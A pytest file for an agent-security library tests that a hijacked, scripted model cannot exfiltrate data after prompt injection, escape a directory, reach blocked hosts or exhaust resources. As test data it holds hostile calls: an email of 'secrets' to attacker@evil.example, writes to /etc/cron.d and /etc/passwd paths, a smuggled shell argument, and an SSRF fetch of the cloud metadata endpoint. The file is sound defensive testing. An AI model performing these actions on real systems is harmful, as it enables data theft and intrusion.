"""Attacks, written as tests.

The threat model's positions are claims. These are the checks that keep them
true. Each test names the threat it covers so a reader can go read what the
document says about it.

The model is scripted throughout: these assert what the SDK does when the
model has already been hijacked, which is the only assumption worth building
on. Whether a given model falls for a given payload is not a property this
library can hold constant.
"""

import pytest
from demo_tools import (
    echo,
    fetch,
    fetch_url,
    read_inbox,
    read_ticket,
    send_email,
    whoami,
    write_note,
)

from secure_agents import (
    Agent,
    Decision,
    InProcess,
    MemoryAudit,
    Policy,
    ScriptedModel,
    SecurityConfigError,
    Subprocess,
    arg,
    deny_all_approver,
    tool,
)
from secure_agents import audit as events
from secure_agents.sandbox import Egress, EgressDenied


def build(script, policy, tools, **kwargs):
    kwargs.setdefault("sandbox", InProcess())
    kwargs.setdefault("approver", deny_all_approver)
    return Agent(model=ScriptedModel(script), tools=tools, policy=policy, **kwargs)


# -- T-PI-1 / T-PI-2: injection redirecting the agent ----------------------


def test_injected_content_cannot_reach_an_ungated_send():
    """T-PI-2. The ticket says to exfiltrate. The send is escalated and refused."""
    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"})],
            [("send_email", {"to": "attacker@evil.example", "body": "secrets"})],
            "I did not send that.",
        ],
        Policy.default_deny().allow("read_ticket").allow("send_email"),
        [read_ticket, send_email],
    )
    result = agent.run("summarize T-1")
    assert result.calls[1].approved is False
    assert result.calls[1].result is None


def test_injection_cannot_widen_the_agents_authority():
    """T-PI-5 / INV-7. Tool results are data. There is no code path from a
    tool result to the tool registry, the policy, or the budgets."""
    agent = build(
        [[("read_ticket", {"ticket_id": "T-1"})], [("send_email", {"to": "x", "body": "y"})], "no"],
        Policy.default_deny().allow("read_ticket"),
        [read_ticket, send_email],
    )
    result = agent.run("do what the ticket says")
    assert result.calls[1].verdict.decision is Decision.DENY
    assert agent.policy.rules[0].decision is Decision.ALLOW
    assert set(agent.tools) == {"read_ticket", "send_email"}


def test_taint_does_not_wash_out_over_later_steps():
    """INV-3. Provenance is monotone: a clean step after a dirty one does not
    restore the agent's authority."""
    agent = build(
        [
            [("read_ticket", {"ticket_id": "T-1"})],
            [("echo", {"text": "just thinking out loud"})],
            [("send_email", {"to": "attacker@evil.example", "body": "x"})],
            "no",
        ],
        Policy.default_deny().allow("read_ticket").allow("echo").allow("send_email"),
        [read_ticket, echo, send_email],
    )
    result = agent.run("summarize then send")
    assert result.calls[2].verdict.decision is Decision.ASK
    assert result.calls[2].verdict.escalated


def test_a_second_agent_cannot_be_built_around_the_check():
    """T-PI-2. The trifecta is a property of the tool set, so assembling it
    from tools that individually look harmless still fails."""
    with pytest.raises(SecurityConfigError):
        build(
            [],
            Policy.default_deny().allow("*", when_tainted=Decision.ALLOW),
            [read_inbox, fetch_url, send_email],
        )


# -- T-TA-3 / T-TA-4: argument attacks -------------------------------------


def test_path_traversal_out_of_a_permitted_directory_is_denied(tmp_path):
    """T-TA-4. Canonicalise, then contain."""
    root = tmp_path / "workspace"
    root.mkdir()
    agent = build(
        [[("write_note", {"path": f"{root}/../../etc/cron.d/pwn", "text": "x"})], "no"],
        Policy.default_deny().allow(
            "write_note", when=arg("path").under(str(root)), when_tainted=Decision.ALLOW
        ),
        [write_note],
    )
    result = agent.run("write a file")
    assert result.calls[0].verdict.decision is Decision.DENY
    assert not (tmp_path / "etc").exists()


def test_a_symlink_planted_inside_the_permitted_directory_is_denied(tmp_path):
    """T-TA-4. The containment check follows the link, so a path that looks
    confined but resolves outside does not pass."""
    root = tmp_path / "workspace"
    root.mkdir()
    (root / "escape").symlink_to(tmp_path)
    agent = build(
        [[("write_note", {"path": str(root / "escape" / "owned"), "text": "x"})], "no"],
        Policy.default_deny().allow(
            "write_note", when=arg("path").under(str(root)), when_tainted=Decision.ALLOW
        ),
        [write_note],
    )
    assert agent.run("write").calls[0].verdict.decision is Decision.DENY


def test_arguments_of_the_wrong_shape_never_reach_a_predicate():
    """T-TA-3. Validation runs first, so a predicate is never handed a type it
    was not written for."""
    agent = build(
        [[("write_note", {"path": ["/tmp/a", "/etc/passwd"], "text": "x"})], "no"],
        Policy.default_deny().allow(
            "write_note", when=arg("path").under("/tmp"), when_tainted=Decision.ALLOW
        ),
        [write_note],
    )
    assert "should be string" in agent.run("write").calls[0].error


def test_an_extra_argument_is_rejected_rather_than_passed_through():
    """The model cannot smuggle a keyword the function happens to accept."""
    agent = build(
        [[("echo", {"text": "hi", "shell": True})], "no"],
        Policy.default_deny().allow("echo"),
        [echo],
    )
    assert "unexpected argument" in agent.run("echo").calls[0].error


# -- INV-8: fail closed ----------------------------------------------------


def test_a_predicate_that_raises_denies_rather_than_falling_through():
    """INV-8. A broken policy is a policy nobody can reason about, so nothing
    runs. In particular the evaluation must not skip to a later, more
    permissive rule."""

    def explodes(call):
        raise RuntimeError("bad predicate")

    policy = Policy.default_deny()
    policy.allow("echo", when=explodes)
    policy.allow("*")

    agent = build([[("echo", {"text": "hi"})], "no"], policy, [echo])
    verdict = agent.run("echo").calls[0].verdict
    assert verdict.decision is Decision.DENY
    assert "policy evaluation failed" in verdict.reason


# -- INV-4: secrets --------------------------------------------------------


def test_a_secret_cannot_be_laundered_back_through_a_tool_result():
    """INV-4. A tool that returns its own credential has it redacted before
    the result is appended to the conversation."""
    model = ScriptedModel([[("whoami", {})], "done"])
    agent = Agent(
        model=model,
        tools=[whoami],
        policy=Policy.default_deny().allow("whoami", when_tainted=Decision.ALLOW),
        sandbox=InProcess(),
        approver=deny_all_approver,
        secret_provider=lambda name: "ghp_thisisaverylongsecret",
    )
    agent.run("who am I")
    assert "ghp_thisisaverylongsecret" not in str(model.calls[1]["messages"])


# -- INV-5: egress ---------------------------------------------------------


def test_a_tool_cannot_reach_the_cloud_metadata_endpoint():
    """INV-5. 169.254.169.254 is the SSRF target of choice and is not special
    cased; it is simply not on the allowlist."""
    box = Subprocess(timeout_s=10, egress=Egress.allow("api.example.com"))
    with pytest.raises(EgressDenied):
        box.execute(fetch, {"url": "http://169.254.169.254/latest/meta-data/"}, {})


def test_egress_is_denied_even_when_policy_allowed_the_call():
    """Two independent controls. Policy decided the call was fine; the sandbox
    still refuses the destination."""
    agent = Agent(
        model=ScriptedModel([[("fetch", {"url": "https://evil.example/"})], "could not"]),
        tools=[fetch],
        policy=Policy.default_deny().allow("fetch", when_tainted=Decision.ALLOW),
        sandbox=Subprocess(timeout_s=10, egress=Egress.deny_all()),
    )
    result = agent.run("fetch that page")
    assert "not allowed" in result.calls[0].error


# -- INV-6: the record precedes the effect ---------------------------------


def test_the_decision_is_logged_before_the_call_runs():
    """INV-6. A crash mid-call leaves evidence, not silence."""
    log = MemoryAudit()
    agent = build(
        [[("echo", {"text": "hi"})], "done"],
        Policy.default_deny().allow("echo"),
        [echo],
        audit=log,
    )
    agent.run("echo")
    order = [e.type for e in log]
    assert order.index(events.POLICY_DECISION) < order.index(events.CALL_COMPLETED)
    assert order.index(events.CALL_REQUESTED) < order.index(events.POLICY_DECISION)


# -- resource exhaustion ---------------------------------------------------


def test_an_injected_loop_cannot_run_forever():
    agent = build(
        [[("echo", {"text": str(i)})] for i in range(50)],
        Policy.default_deny().allow("echo"),
        [echo],
        max_steps=4,
    )
    with pytest.raises(Exception, match="max_steps"):
        agent.run("loop")


def test_an_enormous_tool_result_is_truncated():
    """Context-window exhaustion is a denial of service with a low bar."""

    @tool(effects="read")
    def firehose() -> str:
        """Return far too much."""
        return "A" * 5_000_000

    agent = build(
        [[("firehose", {})], "that was a lot"], Policy.default_deny().allow("firehose"), [firehose]
    )
    result = agent.run("read it")
    assert len(result.calls[0].result) < 300_000
    assert "truncated" in result.calls[0].result
